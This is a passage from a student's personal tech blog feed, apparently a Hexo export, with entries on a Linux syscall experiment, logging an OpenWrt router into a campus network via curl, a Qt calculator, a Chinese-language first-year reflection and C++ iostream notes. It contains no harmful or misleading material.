href="#Compile-Kernel" class="headerlink" title="Compile Kernel"></a>Compile Kernel</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Already practiced in experiment 1 kernel compilation</span></span><br><span class="line">make mrproper</span><br><span class="line">make clean</span><br><span class="line">make -j6</span><br><span class="line">make modules_install</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h3 id="Write-Test-Code"><a href="#Write-Test-Code" class="headerlink" title="Write Test Code"></a>Write Test Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Define SetDebug system call number (needs to be registered in kernel)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_SETDEBUG 447</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SetDebug</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">    syscall(SYS_SETDEBUG, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    SetDebug(<span class="number">1</span>); <span class="comment">// Enable debug information</span></span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// Child process</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Child process ID: %d\n&quot;</span>, getpid());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// Parent process</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Parent process ID: %d\n&quot;</span>, getpid());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// fork failed</span></span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SetDebug(<span class="number">0</span>); <span class="comment">// Disable debug information</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To test the functionality, I commented out the SetDebug function in another test code and executed both programs simultaneously. The expected effect is that only the program that called the SetDebug function will output debug information during fork.</p><p>test1 did not enable print information, test2 enabled print information.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/7-result1.png" alt="Run test1 and test2"></p><p>Use dmesg to view information. In the figure below, we can see a line in the background information about a process being created, cmd&#x3D;test2, and comparing with the child process and parent process PIDs in the above figure, they are also consistent.</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/7-result2.png" alt="dmesg print background information"></p><p>Reference Materials:</p><p><a href="https://zhuanlan.zhihu.com/p/617398860">Linux Kernel Process - do_fork() Function Implementation Principle</a></p><p><a href="https://blog.csdn.net/liushengxi_root/article/details/81332740">Linux Kernel Source Code fork Interpretation</a></p>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Course Experiments </tag>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Campus Network Router Connection with Web Authentication</title>
      <link href="/2023/02/16/Campus%20Network%20Router%20Connection%20with%20Web%20Authentication/"/>
      <url>/2023/02/16/Campus%20Network%20Router%20Connection%20with%20Web%20Authentication/</url>
      
        <content type="html"><![CDATA[<h1 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h1><p>Due to the device quantity limitations of campus network, I wanted to use the campus wired network to connect my own router to remove device quantity restrictions, and implement so-called hardware VPN, where traffic is forwarded through the router to a proxy server, so that devices in the network formed by this router don’t need to start VPN software, saving some trouble.</p><h1 id="Difficulties-and-Solutions"><a href="#Difficulties-and-Solutions" class="headerlink" title="Difficulties and Solutions"></a>Difficulties and Solutions</h1><p>Campus network is different from home network, requiring web authentication to connect. Initially, I thought I could just buy a ready-made router (ASUS TUF AX3000) and connect it for authentication, but it turned out that the authentication interface wouldn’t pop up. So I bought a soft router R2S (essentially a microcomputer) and installed <a href="https://zh.wikipedia.org/zh-hans/OpenWrt">OpenWrt</a> system as the upper-level router, because it’s essentially an embedded Linux system with command-line tools, and I can use the <code>curl</code> command to send HTTP requests to the campus network authentication interface (HUST uses 192.168.50.3) to achieve login. As for VPN, I just need to configure the subscribed proxy server address in the soft router software. Yes, it’s essentially still software VPN, but it’s handled by the gateway.</p><h1 id="Process-Demonstration"><a href="#Process-Demonstration" class="headerlink" title="Process Demonstration"></a>Process Demonstration</h1><h2 id="Equipment-Preparation"><a href="#Equipment-Preparation" class="headerlink" title="Equipment Preparation"></a>Equipment Preparation</h2><p>One router, one soft router, two network cables, one computer.</p><h2 id="Using-Network-Packet-Capture-to-Get-HTTP-Request-Content-Value-for-Campus-Network-Authentication"><a href="#Using-Network-Packet-Capture-to-Get-HTTP-Request-Content-Value-for-Campus-Network-Authentication" class="headerlink" title="Using Network Packet Capture to Get HTTP Request Content Value for Campus Network Authentication"></a>Using Network Packet Capture to Get HTTP Request Content Value for Campus Network Authentication</h2><p>First, connect one end of a network cable to the campus wired network port, and the other end to your computer. Access the campus network authentication interface through a browser, preferably with WiFi disabled. Enter your account and password in advance, <strong>but don’t click login</strong>.<br><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2023-02-16%2020.01.16.png"></p><h3 id="Enter-Developer-Mode"><a href="#Enter-Developer-Mode" class="headerlink" title="Enter Developer Mode"></a>Enter Developer Mode</h3><p>Press F12 to enter the browser’s developer mode, take a general look, and understand the webpage’s logic, specifically the login function<br><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2023-02-16%2020.05.27.png"></p><h3 id="Set-Breakpoint-at-POST-Location"><a href="#Set-Breakpoint-at-POST-Location" class="headerlink" title="Set Breakpoint at POST Location"></a>Set Breakpoint at POST Location</h3><p>Just like debugging code normally.<br><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2023-02-16%2020.06.24.png"></p><h3 id="Click-Login-to-Get-Content-Value"><a href="#Click-Login-to-Get-Content-Value" class="headerlink" title="Click Login to Get Content Value"></a>Click Login to Get Content Value</h3><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2023-02-16%2020.27.04.png"></p><h3 id="Use-curl-Command-to-Send-Request"><a href="#Use-curl-Command-to-Send-Request" class="headerlink" title="Use curl Command to Send Request"></a>Use curl Command to Send Request</h3><p>Write a shell script, or don’t write one at all.<br><img src="https://picx.zhimg.com/80/v2-285e2cea8e82f818410f32dd796559b3_1440w.png"><br>After using the chmod command to give it execution permissions, execute the script. If the return value is “success”, it means the command executed successfully and completed campus network authentication; if not successful, repeat the content acquisition operation, as I also failed the first time.</p><h2 id="Configure-Soft-Router"><a href="#Configure-Soft-Router" class="headerlink" title="Configure Soft Router"></a>Configure Soft Router</h2><h3 id="Install-OpenWrt-System"><a href="#Install-OpenWrt-System" class="headerlink" title="Install OpenWrt System"></a>Install OpenWrt System</h3><p>Since there are many open-source options on GitHub, the effects should be similar, so you can choose any one. Most soft routers bought on Taobao come pre-installed. If you have a completely new machine, refer to the video below to install the OpenWrt system.</p><div class="video-container"><iframe src="https://www.youtube.com/embed/gsrAj1vySaE" frameborder="0" loading="lazy" allowfullscreen></iframe></div><h3 id="Access-Soft-Router-Backend"><a href="#Access-Soft-Router-Backend" class="headerlink" title="Access Soft Router Backend"></a>Access Soft Router Backend</h3><p>Insert the TF card correctly into the soft router and ensure the sys indicator light on your soft router is normal.<br><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2023-02-16%2019.46.52.png"/></p><p>Connect one end of a network cable to the campus wired network port and the other end to the WAN port of the soft router. Connect one end of another network cable to the LAN port of the soft router and the other end to your computer. At this point, the computer and soft router are on the same local network. Access the soft router’s backend through its IP address (this is usually provided by the seller; if not, you can check the gateway’s IP address or disable DHCP for manual assignment) in the browser and log in with username and password.<br><img src="https://picx.zhimg.com/80/v2-7d989b04c23b0a4f5f0bef25068a117a_1440w.png"></p><h3 id="Using-curl-Command-in-Command-Line"><a href="#Using-curl-Command-in-Command-Line" class="headerlink" title="Using curl Command in Command Line"></a>Using curl Command in Command Line</h3><p>Access the soft router’s command line tool and use the curl command written above to perform campus network authentication. It’s best to try pinging Baidu to see if it works.<br><img src="https://pica.zhimg.com/80/v2-1b493abb1ef9054903270b5bdffeabb5_1440w.png"></p><h3 id="Configure-Internet-Access"><a href="#Configure-Internet-Access" class="headerlink" title="Configure Internet Access"></a>Configure Internet Access</h3><p>I use OpenClash, which is built-in software. You can use any proxy software, then configure it like on other devices by entering the subscription URL.<br><img src="https://pic1.zhimg.com/80/v2-d9aab76bd341cae45b8c5524653098e7_1440w.png"></p><h2 id="Configure-Hard-Router"><a href="#Configure-Hard-Router" class="headerlink" title="Configure Hard Router"></a>Configure Hard Router</h2><p>Since soft routers cannot send wireless network signals like regular routers (at least my entry-level machine cannot), you need to use a real router to send WiFi signals or provide more LAN ports for wired network connections. My ASUS router serves this purpose. Focus on the cable connected to the soft router’s LAN port, and change the end that was connected to the computer to connect to the router’s WAN port. Of course, you can also connect it to the LAN port, but you need to use the router’s AP mode. The difference is that when connected to the WAN port, the soft router becomes the upstream router, and you cannot access the soft router’s backend by entering its IP address (at least with my current technical level); when connected to the LAN port, the soft router remains on the same local network as our devices (at this point, the router acts like a switch with wireless functionality).</p><p>I connected it to the WAN port, then used any device that can access the internet to connect to the WiFi signal and complete the initial router setup based on the information provided on the back of the router, such as name and password. This process is relatively simple and won’t be elaborated on further.</p><h1 id="Final-Notes"><a href="#Final-Notes" class="headerlink" title="Final Notes"></a>Final Notes</h1><p>Due to the limitations of school power and network outages causing devices to disconnect at night, we can’t repeatedly log into the soft router backend to connect to the campus network every time. However, it seems that after enabling seamless authentication, it can automatically reconnect even after being disconnected for a while. I’m still planning to write an automatic login and logout script when I have time to comply with school regulations.</p><p>The above method indeed works for my situation, and the router I bought itself supports flashing. Actually, for general home networks that don’t require authentication, you don’t need a soft router. Some ASUS router series support flashing Merlin firmware, which is essentially an OpenWrt system adapted for ASUS routers. Since I haven’t found a better solution yet, I can only maintain the current situation. The soft router serves more as a side router, specifically providing ad-blocking services for the TV box at home, or streaming acceleration, and most importantly, enabling internet access to watch foreign streaming software.</p><p>Reference Article<br><a href="https://blog.csdn.net/qq_30763587/article/details/119523231">Implementing Campus Network Web Authentication under OpenWrt</a><br><a href="https://zhuanlan.zhihu.com/p/443145372?utm_campaign=shareopn&utm_medium=social&utm_oi=1137483569697013760&utm_psn=1609660582969470976&utm_source=wechat_session">Huazhong University of Science and Technology Campus Network Auto-Reconnection</a></p>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Computer Networks - Campus Network - Routing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qt</title>
      <link href="/2022/09/03/Qt/"/>
      <url>/2022/09/03/Qt/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/liubf21/Qt-Practical-Training-For-Programming">Feiye’s Qt Repository</a></p><h1 id="Implementation-of-a-Simple-Calculator"><a href="#Implementation-of-a-Simple-Calculator" class="headerlink" title="Implementation of a Simple Calculator"></a>Implementation of a Simple Calculator</h1><p>Following the video below step by step, you can get a general understanding of Qt, and I personally wrote the functionality for several keys, which can be considered my first simple program with a UI interface.</p><div class="video-container"><iframe src="https://www.youtube.com/embed/txGRU7OrTZo" frameborder="0" loading="lazy" allowfullscreen></iframe></div><p><a href="https://github.com/hustlixiang21/Qt_Practice/tree/main/Calculator">Click to view source code</a></p><p>Effect image:<br><img src="https://picx.zhimg.com/80/v2-9e256ce589cf3dff00310312c0ad7f46_1440w.png" alt="Effect image"></p><h1 id="Adding-Program-Icon"><a href="#Adding-Program-Icon" class="headerlink" title="Adding Program Icon"></a>Adding Program Icon</h1><p>Reference blog: <a href="https://blog.csdn.net/yc__coder/article/details/107425940?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-107425940-blog-79359228.pc_relevant_multi_platform_featuressortv2dupreplace&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-107425940-blog-79359228.pc_relevant_multi_platform_featuressortv2dupreplace&utm_relevant_index=3">Setting Qt Application Icon on Mac</a></p><p>Of course, the best way is to check the <a href="https://resources.qt.io/learning-hub">official documentation</a>.</p>]]></content>
      
      
      <categories>
          
          <category> CS Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Language </tag>
            
            <tag> UI Programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大一学年总结</title>
      <link href="/2022/08/04/%E5%A4%A7%E4%B8%80%E5%AD%A6%E5%B9%B4%E6%80%BB%E7%BB%93/"/>
      <url>/2022/08/04/%E5%A4%A7%E4%B8%80%E5%AD%A6%E5%B9%B4%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p><font size=5px>Get busy living or get busy dying.</font></p></blockquote><iframe src="//player.bilibili.com/player.html?aid=505421421&bvid=BV1Sg411F7cb&cid=405595939&page=1" width=100% height=540 scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><h1 id="一个阶段的结束"><a href="#一个阶段的结束" class="headerlink" title="一个阶段的结束"></a>一个阶段的结束</h1><p>滴滴滴… </p><p>高考结束的铃声响起，身上的重担全部消失了，高中三年第一次全身心放松的离开我的母校，也是最后一次。</p><p><img src="https://pic4.zhimg.com/80/v2-f087e91d7da10e616c5abb9effd0833c_1440w.jpeg"></p><p>在洪高旁边拍摄的最后一张照片，标志高中的结束，我也搬离了那里。这条路，我走过很多很多次，这个湖，我也曾远眺过很多很多次。那时的我喜欢望着远方憧憬着大学的一切，充满梦想与激情。我就是那么一个感性，拥有着一个丰富内心世界的人。</p><blockquote><p>离开了，就永远回不去了。另一个残酷的事实就是，我即将脱离父母的羽翼，独立追求着自己梦想…</p></blockquote><hr><h1 id="开端"><a href="#开端" class="headerlink" title="开端"></a>开端</h1><p>带着高考的些许不甘心和迈入新阶段的激动与憧憬。我来到了这里。1037号森林——华中科技大学。</p><p><img src="https://pic2.zhimg.com/80/v2-35ae425967378f31ee31cbfc10d0178d_1440w.jpeg"></p><hr><p>站在校门前，身旁是大包小包的物件，看着这个陌生的地方，看着这些陌生的人，憧憬着未来几年大学的生活，探索属于我自己的一条路…</p><img src="https://pic1.zhimg.com/80/v2-57a85bdc69159d055a04b90d4570d075_1440w.jpeg" alt="Pulpit rock" width="500" height="650"><hr><p>一段新的、未知的甚至可能是艰难的旅程就此开始…</p><h1 id="适应"><a href="#适应" class="headerlink" title="适应"></a>适应</h1><p>初入大学的我，第一次的挑战，是为期19天的军训，唯一的收获是认识了许多不同的人，听到了许多不同的事儿，最开心的时候莫过于大家坐在一起开心的聊着聊那。累但没有什么压力。</p><p>大学的第一堂课没记错的话应该是微积分，进入一个只在视频上见到过的大教室，坐满了人。和那很窄的桌子，时不时吱吱作响的椅子。四块可以挪动的黑板，上课铃声响起，总之，第一堂课就那么开始了，学习生活就那么开始了。</p><p>刚开始，课不是很多，难度也不是很大。令我感到最不同的是，那种自由的感觉，没有人催促你的感觉，甚至是没有管你的感觉。有大把的时间可以自我支配，打游戏，看手机，刷视频都行。</p><p>我当时就不停的问自己，你想要的生活是什么？我的决定就是，誓死不做摆烂人，我要成为一个能够控制自己身体和意志的人，我需要提高自己各方面的能力！</p><p>我迈开的第一步就是加入学院的学生组织，媒体宣传部，因为我想提升自己社交，工作能力和学习一些实用技术，例如摄影，p图、推文排版。我也认识了很多很多的人，他们对我的帮助也很大。</p><p>第一个学期，学习方面我好像陷入了另一个误区，所有的课程我都不听，自己去学，有的课甚至不去，去图书馆自习，我觉得自己能够搞得好，但是现实似乎略显骨感，分数并不高。好在通过期末痛苦的复习，取得了不错的成绩，没记错的话加权的排名在整个学院应该是第九，分流到信安应该是第三。其实并没有什么出众的地方，无非就是认真复习而已。</p><p>这可能是属于我的一个特质吧，初入一个新的阶段，我适应得会比较快，我也能保持一种谦卑的心态，能够沉得下心来去专注自己的事情。同时也不得不坦白我的一个缺点，浮躁，通常是一切顺利的时候，会把自己的姿态放高，自我感觉良好，然后一个打击之后气焰全无。这一点在第二个学期得到了印证。</p><h1 id="改变"><a href="#改变" class="headerlink" title="改变"></a>改变</h1><p>经过一个学期的适应，我在寒假期间也仔细反思了一下自己的问题，并做出了一些改变。</p><ul><li>认真听课，不迟到，也不早退，不缺课</li><li>找寻自己的方向，探索自己喜欢的方向，找到自己的兴趣</li><li>尽量更多的参加的课外活动，利用好自身的资源</li><li>规划好自己时间，做到能够掌控自己的一切</li></ul><p>而此刻我坐在这里，回顾当时自己的思考，我认为我的这个学期，我过的是相当充实的。</p><p>这第二个学期，我只有在学校解封那一天，和室友出去浪的那一晚上，逃了一节公选课，其余的时候，我从未逃过一节课，即使它是水课，不听的状况仍然也会出现，但是能够认真去做自己事情也算是一种进步，自己感兴趣的地方也会听一听。</p><p>其他的主要的课程，我上课听的时候真的有的时候是晕晕乎乎的，特别是线性代数课程，由于我并没有预习过，每节课都很难受，看着自己陌生的概念，她讲着，我还在看之前的内容。所以我课下作业的时候，会花大量的时间去复习ppt，想清楚每一个细节，作业也会很认真的完成，最后结果也令我非常的满意。其他的课程我几乎也是这样去学习的，我始终坚信，大学的课程并不是为了考倒你，即使会有几个难题，只要平时勤于思考，考试周认真复习，想取得好成绩绝对是不难的。</p><p>我也重拾自己初中的兴趣爱好，踢足球，即使我的身材有点走样了，技术也很不是很好，但是我依然选择加入了院里的足球队，参加过组织的训练，认识了很多学长，很多朋友。我们一同征战华工杯，即使我们在小组内就被淘汰了，我们没有失掉自己的信心，大家相聚一起，有球踢，有天聊，开心就好。</p><p>课外的竞赛方面，我跟两个数院的学长参加了美赛，我是作为论文手，我当时课下自学了latex排版，最终的翻译排版都是由我完成的。结果也非常令我出乎意料，拿了一个F（Finalist）奖(获奖率比较低)，当时真的很激动开心，可以算是我大学第一个竞赛的奖项。值得一提的还有我人生中第一笔奖学金，新生学习优秀奖学金（600元）。这些都是对于我的努力的肯定，心里的确是非常的开心。</p><p>课余的学习生活中，我也学习过不少的课外知识，学习过py，cpp和linux命令行，这些要么在我<a href="https://github.com/">github的仓库</a>里，要么在<a href="https://hustlixiang21.github.io/">我的博客</a>里都留下了记录，我感觉更多的还是被课内繁杂的课程占用了大部分的时间，被加权分数所裹挟，我深知自己不该把加权看的太重，但是周围的环境却时刻提醒着我自己，需要拿到保研名额并不容易。而我现在的想法就是<strong>保持+拓宽</strong>。保持住自己的加权就行，不必日日夜夜围绕着分数，我觉的更重要的还是练就自己一身的本领，学习自己感兴趣的技术。如果可以，加入一个科研团队，锻炼自己的科研水平。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在华科的一年时光就这么过去了，而自己也褪去了年幼时的那份稚嫩，羽翼渐丰。这一年里，有对新生活的不断适应与改变，认识了诸多好友，参与了许多有趣的活动，收获了不可多得的快乐；在学习生活方面也取得了不错的成绩，学年加权91.15，位列 4&#x2F;98 ，甚至拿了美赛的一个奖项；情感方面，少了高中时的一些臭毛病，可以说是慢慢走向正轨，也不知不觉在一起三年多了，希望以后的路也能继续一起走完吧。</p><p>至于对未来的憧憬，希望自己能够成为一个自己想要成为的人，走出国门去看看世界，抑或是进入国内更高层次的学府去深造，一份安稳的工作，一个美满的家庭，其实这已经是很多人梦寐以求的生活，是以不敢奢望太多。我只知我不惧未知，也敢于拼搏…</p><blockquote><p>Having dreams is what makes life tolerable.</p></blockquote><p>深知自己文笔有限，还是多读读书，多写点东西慢慢提升吧，这一年的回顾，就到这了…</p><p align="right"><font size=4><b>八月四日晚八点，于校图书馆</b></font></p><hr><br><p style="text-align:center;font-size:20px;">最后附上几张照片，以纪念这匆匆逝去的一年。</p><div class="gallery-container" data-type="data" data-button="" data-limit="10" data-first="10">    <div class="gallery-items">[{"url":"https://pic1.zhimg.com/80/v2-e72f84985fe12334cccd92b012f72336_1440w.jpeg","alt":"img","title":""},{"url":"https://pica.zhimg.com/80/v2-e858eda3937d5b629d5a11013a110af4_1440w.jpeg","alt":"img","title":""},{"url":"https://pic4.zhimg.com/80/v2-025ae25e21b536130df53a272fbb34c4_1440w.jpeg","alt":"img","title":""},{"url":"https://pic1.zhimg.com/80/v2-a4f01cff9ab56596369c93d988d3db47_1440w.jpeg","alt":"img","title":""},{"url":"https://pica.zhimg.com/80/v2-e9135724d7f5c138a04a5e6f38bd84c7_1440w.jpeg","alt":"img","title":""},{"url":"https://pica.zhimg.com/80/v2-5a8d823eb451fc6855cb9f9a781723dd_1440w.jpeg","alt":"img","title":""},{"url":"https://pica.zhimg.com/80/v2-0256b20f83c5e2bcdce8de54464eb774_1440w.jpeg","alt":"img","title":""},{"url":"https://pic1.zhimg.com/80/v2-ebf47ce94ec315447883cdd8f664ac91_1440w.jpeg","alt":"img","title":""}]</div>  </div>]]></content>
      
      
      <categories>
          
          <category> 心路 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人反思 </tag>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stream Library and Input/Output</title>
      <link href="/2022/08/04/Stream%20Library%20and%20Input/Output/"/>
      <url>/2022/08/04/Stream%20Library%20and%20Input/Output/</url>
      
        <content type="html"><![CDATA[<h1 id="I-O-Stream-Concepts-and-Stream-Library-Structure"><a href="#I-O-Stream-Concepts-and-Stream-Library-Structure" class="headerlink" title="I&#x2F;O Stream Concepts and Stream Library Structure"></a>I&#x2F;O Stream Concepts and Stream Library Structure</h1><p> A program creates a <strong>stream object</strong>:</p><ul><li>When a program exchanges information with the external environment, there are two objects: one is the <strong>object in the program</strong>, and the other is the <strong>file object</strong>.</li><li>A stream is an abstraction that is responsible for establishing connections between <strong>data producers</strong> and <strong>data consumers</strong> and managing data flow.</li></ul><p>Specify that this stream object establishes a connection with a certain file object. The program operates the stream object, and the object acts on the connected file object through the file system.</p><blockquote><p>Operating systems treat keyboards, screens, printers, and communication ports as extended files, and this processing is implemented through the operating system’s device drivers. These devices are equivalent to disk files.</p></blockquote><p>Read operations in the general sense are called <strong>extraction</strong> (from the stream) in stream data objects, and write operations are called <strong>insertion</strong> (into the stream).</p><p style="text-align:center;">I/O Stream Class List</p>![](https://pic3.zhimg.com/80/v2-4544fd2b14037c1638862690c745edc2_1440w.png)<h1 id="Output-Streams"><a href="#Output-Streams" class="headerlink" title="Output Streams"></a>Output Streams</h1><p>The three most important output streams:</p><ul><li>ostream</li><li>ofstream</li><li>ostringstream</li></ul><p>Predefined output stream objects:</p><ul><li>cout standard output</li><li>cerr standard error output, no buffering, content sent to it is immediately output.</li><li>clog similar to cerr, but with buffering, output when buffer is full.</li></ul><h2 id="Constructing-Output-Stream-Objects"><a href="#Constructing-Output-Stream-Objects" class="headerlink" title="Constructing Output Stream Objects"></a>Constructing Output Stream Objects</h2><p>Common methods for constructing file output streams:</p><ol><li>Use default constructor, then call open member function. <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ofstream myFile; <span class="comment">//Define a static file output stream object</span></span><br><span class="line">myFile.<span class="built_in">open</span>(<span class="string">&quot;filename&quot;</span>); <span class="comment">//Open file, establish connection between stream object and file</span></span><br></pre></td></tr></table></figure></li><li>Specify filename when calling constructor: <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ofstream <span class="title">myFile</span><span class="params">(<span class="string">&quot;filename&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure></li><li>Can specify mode when constructing object or opening file with open <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ofstream <span class="title">myFile</span><span class="params">(<span class="string">&quot;filename&quot;</span>, ios_base::out | ios_base::binary)</span></span>;</span><br></pre></td></tr></table></figure></li><li>Can also use the same stream object to open different files sequentially (only one is open at a time)</li></ol><h2 id="File-Output-Stream-Member-Functions"><a href="#File-Output-Stream-Member-Functions" class="headerlink" title="File Output Stream Member Functions"></a>File Output Stream Member Functions</h2><p>Three types:</p><ul><li>Member functions equivalent to manipulators.</li><li>Member functions that perform unformatted write operations.</li><li>Other member functions that modify stream state and are different from manipulators or insertion operators.</li></ul><p>File output stream member functions</p><ul><li>open function<ul><li>Associates the stream with a specific disk file.</li><li>Need to specify opening mode.</li></ul></li><li>put function<ul><li>Writes a character to the output stream.</li></ul></li><li>write function<ul><li>Writes a block of content from memory to a file output stream</li></ul></li><li>seekp and tellp functions<ul><li>Operate the internal pointer of the file stream</li></ul></li><li>close function<ul><li>Closes the disk file associated with a file output stream</li></ul></li><li>Error handling functions<ul><li>Error handling when writing to a stream</li></ul></li></ul><h2 id="Output-to-Text-Files"><a href="#Output-to-Text-Files" class="headerlink" title="Output to Text Files"></a>Output to Text Files</h2><p>Standard output device display is treated as a text file by the system, so we use output to standard device as an example to introduce text file output format control.</p><h3 id="Insertion-Operator"><a href="#Insertion-Operator" class="headerlink" title="Insertion Operator"></a>Insertion Operator</h3><p>Insertion (&lt;&lt;) operator: Pre-designed for all standard C++ data types, used to transfer bytes to an output stream object.</p><h3 id="Manipulators"><a href="#Manipulators" class="headerlink" title="Manipulators"></a>Manipulators</h3><p>Insertion operators work with manipulators to control output format.</p><ul><li>Many manipulators are defined in the ios_base class (such as hex()) and &lt;iomanip&gt; header file (such as setprecision()).</li><li>Control output width: Place setw manipulator in the stream or call width member function to specify output width for each item.<blockquote><p>setw and width only affect the immediately following output item, but other stream format manipulators remain effective until changed.</p></blockquote></li><li>dec, oct and hex manipulators set the default base for input and output</li></ul><h4 id="Setting-Width"><a href="#Setting-Width" class="headerlink" title="Setting Width"></a>Setting Width</h4><p><a href="https://github.com/hustlixiang21/cpp-practice/blob/main/%E4%BD%BF%E7%94%A8width%E6%8E%A7%E5%88%B6%E8%BE%93%E5%87%BA%E5%AE%BD%E5%BA%A6/main.cpp">width source code</a><br><a href="https://github.com/hustlixiang21/cpp-practice/blob/main/%E4%BD%BF%E7%94%A8setw%E6%93%8D%E7%BA%B5%E7%AC%A6%E6%8C%87%E5%AE%9A%E5%AE%BD%E5%BA%A6/main.cpp">setw source code</a></p><blockquote><p>width member function is declared in iostream. If using setw or any other manipulator with parameters, must include <strong>iomanip</strong></p></blockquote><h4 id="Alignment"><a href="#Alignment" class="headerlink" title="Alignment"></a>Alignment</h4><p><a href="https://github.com/hustlixiang21/cpp-practice/blob/main/%E8%AE%BE%E7%BD%AE%E5%AF%B9%E9%BD%90%E6%96%B9%E5%BC%8F/main.cpp">Set alignment source code</a></p><h4 id="setiosflags-Manipulator"><a href="#setiosflags-Manipulator" class="headerlink" title="setiosflags Manipulator"></a>setiosflags Manipulator</h4><p>In this program, left alignment is set by using the setiosflags manipulator with parameters. setiosflags is defined in the iomanip header file.</p><ul><li>Parameter ios_base::left is a static constant of ios_base, so the ios_base:: prefix must be included when referencing.</li><li>Here we need to use the resetiosflags manipulator to <strong>turn off the left alignment flag</strong>. setiosflags is different from width and setw, its <strong>effect is persistent</strong> until resetiosflags is used to restore the default value.</li><li>The parameter of setiosflags is the format flag value of the stream, which can be <strong>combined</strong> using the bitwise OR (|) operator.</li></ul><p><img src="https://pic4.zhimg.com/80/v2-aebc935a529984f183707440dd181431_1440w.png"></p><h4 id="Precision"><a href="#Precision" class="headerlink" title="Precision"></a>Precision</h4><p> The default value for floating-point output precision is 6, for example: 3466.98.</p><ul><li>To change precision: setprecision manipulator (defined in iomanip header file)</li><li>If fixed or scientific is not specified, the precision value represents the number of significant digits.</li><li>If ios_base::fixed or ios_base::scientific is set, the precision value represents the number of digits after the decimal point.</li></ul><p><a href="https://github.com/hustlixiang21/cpp-practice/blob/main/%E6%8E%A7%E5%88%B6%E8%BE%93%E5%87%BA%E7%B2%BE%E5%BA%A6/main.cpp">Control output precision - without specifying fixed or scientific</a><br><a 